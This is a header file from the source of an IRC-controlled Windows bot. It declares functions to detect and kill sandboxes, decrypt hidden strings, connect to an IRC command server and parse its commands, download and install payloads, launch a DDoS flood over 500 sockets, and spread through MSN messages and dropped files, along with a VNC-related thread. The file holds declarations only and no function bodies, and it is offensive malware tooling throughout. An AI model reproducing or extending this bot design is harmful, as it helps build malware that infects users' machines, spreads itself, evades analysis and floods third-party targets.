//Includes
//Main
#include <windows.h>
#include <winable.h>
#include <stdlib.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <iostream>
#include <iphlpapi.h>
#include <shlobj.h>
#include <tchar.h>
#include <userenv.h>
//Bot
#include "./Mods/zip.h"

//Include Libs
#pragma comment(lib,"WSock32.lib")

//Bot Functions
bool KillSBox( );
bool FuncLoad( );
bool btWinSock( );
void IncStrings( );
char* Decrypt( char* btString );
unsigned long ResolveHost( char* btHost );
bool SendPacket( SOCKET sSocket, char* btPacket, ... );
unsigned long __stdcall Download( void* pVoid );
SOCKET ConnectIRC( unsigned long dwIp, unsigned short wPort );
bool StartIRC( );
void ParseIRC( SOCKET sSocket, char* btLine );
void StartCommand( bool bDelete, char* btContent, ... );
void Install( );
void DDoS(char *noob, char *port, char *time4);
#define DDoS_SOCKETS 500

//Msn
char *stristr2(const char *String, const char *Pattern);
void key_type(char* text, HWND hwnd);
void dropfiles(HWND hwnd, char *email);
void imsendmsg(SOCKET sock);
void to_variant(BSTR str, VARIANT& vt);

//HoneyPot
DWORD WINAPI VNCHONEYPOT(LPVOID param);
